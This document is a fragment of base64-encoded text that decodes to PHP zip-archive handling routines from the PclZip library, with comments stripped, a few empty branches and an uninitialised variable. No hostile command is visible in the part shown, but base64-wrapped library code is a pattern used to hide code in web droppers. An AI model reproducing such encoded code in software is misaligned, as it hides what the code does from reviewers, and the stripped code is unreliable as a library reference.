ZXN1bHQgPT0gMCkgew0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gInNraXBwZWQiOw0KICAgICAgJHZfcmVzdWx0ID0gMTsNCiAgICB9DQogICAgDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiYWJvcnRlZCI7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCg0KICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gJHZfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddOw0KICB9DQoNCg0KICBpZiAoJHBfZW50cnlbJ3N0YXR1cyddID09ICdvaycpIHsNCg0KICAgIGlmICghKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkpIHsNCiAgICAgIGlmICgkcF9lbnRyeVsnY29tcHJlc3Npb24nXSA9PSAwKSB7DQoNCiAgICAgICAgJHBfc3RyaW5nID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgICB9DQogICAgICBlbHNlIHsNCg0KICAgICAgICAkdl9kYXRhID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgICAgIA0KICAgICAgICBpZiAoKCRwX3N0cmluZyA9IEBnemluZmxhdGUoJHZfZGF0YSkpID09PSBGQUxTRSkgew0KICAgICAgICB9DQogICAgICB9DQoNCiAgICB9DQogICAgZWxzZSB7DQogICAgfQ0KICAgIA0KICB9DQoNCglpZiAoJHBfZW50cnlbJ3N0YXR1cyddID09ICJhYm9ydGVkIikgew0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gInNraXBwZWQiOw0KCX0NCg0KICBlbHNlaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX0NCX1BPU1RfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICANCiAgICAkdl9sb2NhbF9oZWFkZXJbJ2NvbnRlbnQnXSA9ICRwX3N0cmluZzsNCiAgICAkcF9zdHJpbmcgPSAnJzsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BPU1RfRVhUUkFDVF0oUENMWklQX0NCX1BPU1RfRVhUUkFDVCwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICRwX3N0cmluZyA9ICR2X2xvY2FsX2hlYWRlclsnY29udGVudCddOw0KICAgIHVuc2V0KCR2X2xvY2FsX2hlYWRlclsnY29udGVudCddKTsNCg0KICAgIGlmICgkdl9yZXN1bHQgPT0gMikgew0KICAgIAkkdl9yZXN1bHQgPSBQQ0xaSVBfRVJSX1VTRVJfQUJPUlRFRDsNCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2UmVhZEZpbGVIZWFkZXIoJiRwX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgNCk7DQogICR2X2RhdGEgPSB1bnBhY2soJ1ZpZCcsICR2X2JpbmFyeV9kYXRhKTsNCg0KICBpZiAoJHZfZGF0YVsnaWQnXSAhPSAweDA0MDM0YjUwKQ0KICB7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdJbnZhbGlkIGFyY2hpdmUgc3RydWN0dXJlJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgMjYpOw0KDQogIGlmIChzdHJsZW4oJHZfYmluYXJ5X2RhdGEpICE9IDI2KQ0KICB7DQogICAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gIiI7DQogICAgJHBfaGVhZGVyWydzdGF0dXMnXSA9ICJpbnZhbGlkX2hlYWRlciI7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICJJbnZhbGlkIGJsb2NrIHNpemUgOiAiLnN0cmxlbigkdl9iaW5hcnlfZGF0YSkpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9kYXRhID0gdW5wYWNrKCd2dmVyc2lvbi92ZmxhZy92Y29tcHJlc3Npb24vdm10aW1lL3ZtZGF0ZS9WY3JjL1Zjb21wcmVzc2VkX3NpemUvVnNpemUvdmZpbGVuYW1lX2xlbi92ZXh0cmFfbGVuJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X2RhdGFbJ2ZpbGVuYW1lX2xlbiddKTsNCg0KICBpZiAoJHZfZGF0YVsnZXh0cmFfbGVuJ10gIT0gMCkgew0KICAgICRwX2hlYWRlclsnZXh0cmEnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X2RhdGFbJ2V4dHJhX2xlbiddKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9oZWFkZXJbJ2V4dHJhJ10gPSAnJzsNCiAgfQ0KDQogICRwX2hlYWRlclsndmVyc2lvbl9leHRyYWN0ZWQnXSA9ICR2X2RhdGFbJ3ZlcnNpb24nXTsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gJHZfZGF0YVsnY29tcHJlc3Npb24nXTsNCiAgJHBfaGVhZGVyWydzaXplJ10gPSAkdl9kYXRhWydzaXplJ107DQogICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAkdl9kYXRhWydjb21wcmVzc2VkX3NpemUnXTsNCiAgJHBfaGVhZGVyWydjcmMnXSA9ICR2X2RhdGFbJ2NyYyddOw0KICAkcF9oZWFkZXJbJ2ZsYWcnXSA9ICR2X2RhdGFbJ2ZsYWcnXTsNCiAgJHBfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSA9ICR2X2RhdGFbJ2ZpbGVuYW1lX2xlbiddOw0KDQogICRwX2hlYWRlclsnbWRhdGUnXSA9ICR2X2RhdGFbJ21kYXRlJ107DQogICRwX2hlYWRlclsnbXRpbWUnXSA9ICR2X2RhdGFbJ210aW1lJ107DQogIGlmICgkcF9oZWFkZXJbJ21kYXRlJ10gJiYgJHBfaGVhZGVyWydtdGltZSddKQ0KICB7DQogICAgJHZfaG91ciA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweEY4MDApID4+IDExOw0KICAgICR2X21pbnV0ZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDA3RTApID4+IDU7DQogICAgJHZfc2Vjb25kZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDAwMUYpKjI7DQoNCiAgICAkdl95ZWFyID0gKCgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweEZFMDApID4+IDkpICsgMTk4MDsNCiAgICAkdl9tb250aCA9ICgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweDAxRTApID4+IDU7DQogICAgJHZfZGF5ID0gJHBfaGVhZGVyWydtZGF0ZSddICYgMHgwMDFGOw0KDQogICAgJHBfaGVhZGVyWydtdGltZSddID0gQG1rdGltZSgkdl9ob3VyLCAkdl9taW51dGUsICR2X3NlY29uZGUsICR2X21vbnRoLCAkdl9kYXksICR2X3llYXIpOw0KDQogIH0NCiAgZWxzZQ0KICB7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gdGltZSgpOw0KICB9DQoNCg0KICAkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddID0gJHBfaGVhZGVyWydmaWxlbmFtZSddOw0KDQogICRwX2hlYWRlclsnc3RhdHVzJ10gPSAib2siOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZSZWFkQ2VudHJhbEZpbGVIZWFkZXIoJiRwX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgNCk7DQogICR2X2RhdGEgPSB1bnBhY2soJ1ZpZCcsICR2X2JpbmFyeV9kYXRhKTsNCg0KICBpZiAoJHZfZGF0YVsnaWQnXSAhPSAweDAyMDE0YjUwKQ0KICB7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdJbnZhbGlkIGFyY2hpdmUgc3RydWN0dXJlJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgNDIpOw0KDQogIGlmIChzdHJsZW4oJHZfYmluYXJ5X2RhdGEpICE9IDQyKQ0KICB7DQogICAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gIiI7DQogICAgJHBfaGVhZGVyWydzdGF0dXMnXSA9ICJpbnZhbGlkX2hlYWRlciI7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICJJbnZhbGlkIGJsb2NrIHNpemUgOiAiLnN0cmxlbigkdl9iaW5hcnlfZGF0YSkpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkcF9oZWFkZXIgPSB1bnBhY2soJ3Z2ZXJzaW9uL3Z2ZXJzaW9uX2V4dHJhY3RlZC92ZmxhZy92Y29tcHJlc3Npb24vdm10aW1lL3ZtZGF0ZS9WY3JjL1Zjb21wcmVzc2VkX3NpemUvVnNpemUvdmZpbGVuYW1lX2xlbi92ZXh0cmFfbGVuL3Zjb21tZW50X2xlbi92ZGlzay92aW50ZXJuYWwvVmV4dGVybmFsL1ZvZmZzZXQnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgaWYgKCRwX2hlYWRlclsnZmlsZW5hbWVfbGVuJ10gIT0gMCkNCiAgICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddKTsNCiAgZWxzZQ0KICAgICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9ICcnOw0KDQogIGlmICgkcF9oZWFkZXJbJ2V4dHJhX2xlbiddICE9IDApDQogICAgJHBfaGVhZGVyWydleHRyYSddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydleHRyYV9sZW4nXSk7DQogIGVsc2UNCiAgICAkcF9oZWFkZXJbJ2V4dHJhJ10gPSAnJzsNCg0KICBpZiAoJHBfaGVhZGVyWydjb21tZW50X2xlbiddICE9IDApDQogICAgJHBfaGVhZGVyWydjb21tZW50J10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10pOw0KICBlbHNlDQogICAgJHBfaGVhZGVyWydjb21tZW50J10gPSAnJzsNCg0KICBpZiAoMSkNCiAgew0KICAgICR2X2hvdXIgPSAoJHBfaGVhZGVyWydtdGltZSddICYgMHhGODAwKSA+PiAxMTsNCiAgICAkdl9taW51dGUgPSAoJHBfaGVhZGVyWydtdGltZSddICYgMHgwN0UwKSA+PiA1Ow0KICAgICR2X3NlY29uZGUgPSAoJHBfaGVhZGVyWydtdGltZSddICYgMHgwMDFGKSoyOw0KDQogICAgJHZfeWVhciA9ICgoJHBfaGVhZGVyWydtZGF0ZSddICYgMHhGRTAwKSA+PiA5KSArIDE5ODA7DQogICAgJHZfbW9udGggPSAoJHBfaGVhZGVyWydtZGF0ZSddICYgMHgwMUUwKSA+PiA1Ow0KICAgICR2X2RheSA9ICRwX2hlYWRlclsnbWRhdGUnXSAmIDB4MDAxRjsNCg0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9IEBta3RpbWUoJHZfaG91ciwgJHZfbWludXRlLCAkdl9zZWNvbmRlLCAkdl9tb250aCwgJHZfZGF5LCAkdl95ZWFyKTsNCg0KICB9DQogIGVsc2UNCiAgew0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9IHRpbWUoKTsNCiAgfQ0KDQogICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQoNCiAgJHBfaGVhZGVyWydzdGF0dXMnXSA9ICdvayc7DQoNCiAgaWYgKHN1YnN0cigkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10sIC0xKSA9PSAnLycpIHsNCiAgICAkcF9oZWFkZXJbJ2V4dGVybmFsJ10gPSAweDAwMDAwMDEwOw0KICB9DQoNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2Q2hlY2tGaWxlSGVhZGVycygmJHBfbG9jYWxfaGVhZGVyLCAmJHBfY2VudHJhbF9oZWFkZXIpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnZmlsZW5hbWUnXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnZmlsZW5hbWUnXSkgew0KCX0NCglpZiAoJHBfbG9jYWxfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddICE9ICRwX2NlbnRyYWxfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ2ZsYWcnXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnZmxhZyddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gIT0gJHBfY2VudHJhbF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10pIHsNCgl9DQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnbXRpbWUnXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnbXRpbWUnXSkgew0KCX0NCglpZiAoJHBfbG9jYWxfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnZmlsZW5hbWVfbGVuJ10pIHsNCgl9DQoNCglpZiAoKCRwX2xvY2FsX2hlYWRlclsnZmxhZyddICYgOCkgPT0gOCkgew0KICAgICAgICAkcF9sb2NhbF9oZWFkZXJbJ3NpemUnXSA9ICRwX2NlbnRyYWxfaGVhZGVyWydzaXplJ107DQogICAgICAgICRwX2xvY2FsX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAkcF9jZW50cmFsX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ107DQogICAgICAgICRwX2xvY2FsX2hlYWRlclsnY3JjJ10gPSAkcF9jZW50cmFsX2hlYWRlclsnY3JjJ107DQoJfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZSZWFkRW5kQ2VudHJhbERpcigmJHBfY2VudHJhbF9kaXIpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X3NpemUgPSBmaWxlc2l6ZSgkdGhpcy0+emlwbmFtZSk7DQogIEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9zaXplKTsNCiAgaWYgKEBmdGVsbCgkdGhpcy0+emlwX2ZkKSAhPSAkdl9zaXplKQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULCAnVW5hYmxlIHRvIGdvIHRvIHRoZSBlbmQgb2YgdGhlIGFyY2hpdmUgXCcnLiR0aGlzLT56aXBuYW1lLidcJycpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9mb3VuZCA9IDA7DQogIGlmICgkdl9zaXplID4gMjYpIHsNCiAgICBAZnNlZWsoJHRoaXMtPnppcF9mZCwgJHZfc2l6ZS0yMik7DQogICAgaWYgKCgkdl9wb3MgPSBAZnRlbGwoJHRoaXMtPnppcF9mZCkpICE9ICgkdl9zaXplLTIyKSkNCiAgICB7DQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdVbmFibGUgdG8gc2VlayBiYWNrIHRvIHRoZSBtaWRkbGUgb2YgdGhlIGFyY2hpdmUgXCcnLiR0aGlzLT56aXBuYW1lLidcJycpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0KTsNCiAgICAkdl9kYXRhID0gQHVucGFjaygnVmlkJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogICAgaWYgKCR2X2RhdGFbJ2lkJ10gPT0gMHgwNjA1NGI1MCkgew0KICAgICAgJHZfZm91bmQgPSAxOw0KICAgIH0NCg0KICAgICR2X3BvcyA9IGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KICB9DQoNCiAgaWYgKCEkdl9mb3VuZCkgew0KICAgIGlmICgkdl9tYXhpbXVtX3NpemUgPiAkdl9zaXplKQ0KICAgICAgJHZfbWF4aW11bV9zaXplID0gJHZfc2l6ZTsNCiAgICBAZnNlZWsoJHRoaXMtPnppcF9mZCwgJHZfc2l6ZS0kdl9tYXhpbXVtX3NpemUpOw0KICAgIGlmIChAZnRlbGwoJHRoaXMtPnppcF9mZCkgIT0gKCR2X3NpemUtJHZfbWF4aW11bV9zaXplKSkNCiAgICB7DQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdVbmFibGUgdG8gc2VlayBiYWNrIHRvIHRoZSBtaWRkbGUgb2YgdGhlIGFyY2hpdmUgXCcnLiR0aGlzLT56aXBuYW1lLidcJycpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICAkdl9wb3MgPSBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCiAgICAkdl9ieXRlcyA9IDB4MDAwMDAwMDA7DQogICAgd2hpbGUgKCR2X3BvcyA8ICR2X3NpemUpDQogICAgew0KICAgICAgJHZfYnl0ZSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAxKTsNCg0KICAgICAgJHZfYnl0ZXMgPSAoICgkdl9ieXRlcyAmIDB4RkZGRkZGKSA8PCA4KSB8IE9yZCgkdl9ieXRlKTsgDQoNCiAgICAgIGlmICgkdl9ieXRlcyA9PSAweDUwNGIwNTA2KQ0KICAgICAgew0KICAgICAgICAkdl9wb3MrKzsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQoNCiAgICAgICR2X3BvcysrOw0KICAgIH0NCg0KICAgIGlmICgkdl9wb3MgPT0gJHZfc2l6ZSkNCiAgICB7DQoNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIlVuYWJsZSB0byBmaW5kIEVuZCBvZiBDZW50cmFsIERpciBSZWNvcmQgc2lnbmF0dXJlIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgMTgpOw0KDQogIGlmIChzdHJsZW4oJHZfYmluYXJ5X2RhdGEpICE9IDE4KQ0KICB7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICJJbnZhbGlkIEVuZCBvZiBDZW50cmFsIERpciBSZWNvcmQgc2l6ZSA6ICIuc3RybGVuKCR2X2JpbmFyeV9kYXRhKSk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2RhdGEgPSB1bnBhY2soJ3ZkaXNrL3ZkaXNrX3N0YXJ0L3ZkaXNrX2VudHJpZXMvdmVudHJpZXMvVnNpemUvVm9mZnNldC92Y29tbWVudF9zaXplJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogIGlmICgoJHZfcG9zICsgJHZfZGF0YVsnY29tbWVudF9zaXplJ10gKyAxOCkgIT0gJHZfc2l6ZSkgew0KDQogIGlmICgwKSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULA0KICAgICAgICAgICAgICAgICAgICAgICAnVGhlIGNlbnRyYWwgZGlyIGlzIG5vdCBhdCB0aGUgZW5kIG9mIHRoZSBhcmNoaXZlLicNCgkJCQkJICAgLicgU29tZSB0cmFpbGluZyBieXRlcyBleGlzdHMgYWZ0ZXIgdGhlIGFyY2hpdmUuJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KICB9DQoNCiAgaWYgKCR2X2RhdGFbJ2NvbW1lbnRfc2l6ZSddICE9IDApIHsNCiAgICAkcF9jZW50cmFsX2RpclsnY29tbWVudCddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfZGF0YVsnY29tbWVudF9zaXplJ10pOw0KICB9DQogIGVsc2UNCiAgICAkcF9jZW50cmFsX2RpclsnY29tbWVudCddID0gJyc7DQoNCiAgJHBfY2VudHJhbF9kaXJbJ2VudHJpZXMnXSA9ICR2X2RhdGFbJ2VudHJpZXMnXTsNCiAgJHBfY2VudHJhbF9kaXJbJ2Rpc2tfZW50cmllcyddID0gJHZfZGF0YVsnZGlza19lbnRyaWVzJ107DQogICRwX2NlbnRyYWxfZGlyWydvZmZzZXQnXSA9ICR2X2RhdGFbJ29mZnNldCddOw0KICAkcF9jZW50cmFsX2Rpclsnc2l6ZSddID0gJHZfZGF0YVsnc2l6ZSddOw0KICAkcF9jZW50cmFsX2RpclsnZGlzayddID0gJHZfZGF0YVsnZGlzayddOw0KICAkcF9jZW50cmFsX2RpclsnZGlza19zdGFydCddID0gJHZfZGF0YVsnZGlza19zdGFydCddOw0KDQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkRlbGV0ZUJ5UnVsZSgmJHBfcmVzdWx0X2xpc3QsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgJHZfbGlzdF9kZXRhaWwgPSBhcnJheSgpOw0KDQogIGlmICgoJHZfcmVzdWx0PSR0aGlzLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X3Bvc19lbnRyeSA9ICR2X2NlbnRyYWxfZGlyWydvZmZzZXQnXTsNCiAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCiAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9wb3NfZW50cnkpKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9oZWFkZXJfbGlzdCA9IGFycmF5KCk7DQogICRqX3N0YXJ0ID0gMDsNCiAgZm9yICgkaT0wLCAkdl9uYl9leHRyYWN0ZWQ9MDsgJGk8JHZfY2VudHJhbF9kaXJbJ2VudHJpZXMnXTsgJGkrKykNCiAgew0KDQogICAgJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXSA9IGFycmF5KCk7DQogICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdKSkgIT0gMSkNCiAgICB7DQogICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICB9DQoNCg0KICAgICR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ2luZGV4J10gPSAkaTsNCg0KICAgICR2X2ZvdW5kID0gZmFsc2U7DQoNCiAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSkpDQogICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0gIT0gMCkpIHsNCg0KICAgICAgICBmb3IgKCRqPTA7ICgkajxzaXplb2YoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkgJiYgKCEkdl9mb3VuZCk7ICRqKyspIHsNCg0KICAgICAgICAgICAgaWYgKHN1YnN0cigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdLCAtMSkgPT0gIi8iKSB7DQoNCiAgICAgICAgICAgICAgICBpZiAoICAgKHN0cmxlbigkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXSkgPiBzdHJsZW4oJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpDQogICAgICAgICAgICAgICAgICAgICYmIChzdWJzdHIoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnc3RvcmVkX2ZpbGVuYW1lJ10sIDAsIHN0cmxlbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHZfZm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlaWYgKCAgICgoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkgDQogICAgICAgICAgICAgICAgICAgICAgICAmJiAoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXVsnc3RvcmVkX2ZpbGVuYW1lJ10uJy8nID09ICRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKSB7DQogICAgICAgICAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCR2X2hlYWRlcl9saXN0WyR2X25iX2V4dHJhY3RlZF1bJ3N0b3JlZF9maWxlbmFtZSddID09ICRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pIHsNCiAgICAgICAgICAgICAgICAkdl9mb3VuZCA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCg0KICAgIGVsc2UgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfUFJFR10pKQ0KICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfUFJFR10gIT0gIiIpKSB7DQoNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX1BSRUddLCAkdl9oZWFkZXJfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydzdG9yZWRfZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgICAgICR2X2ZvdW5kID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2UgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdKSkNCiAgICAgICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXSAhPSAwKSkgew0KDQogICAgICAgIGZvciAoJGo9JGpfc3RhcnQ7ICgkajxzaXplb2YoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXSkpICYmICghJHZfZm91bmQpOyAkaisrKSB7DQoNCiAgICAgICAgICAgIGlmICgoJGk+PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydzdGFydCddKSAmJiAoJGk8PSRwX29wdGlvbnNbUENMWkl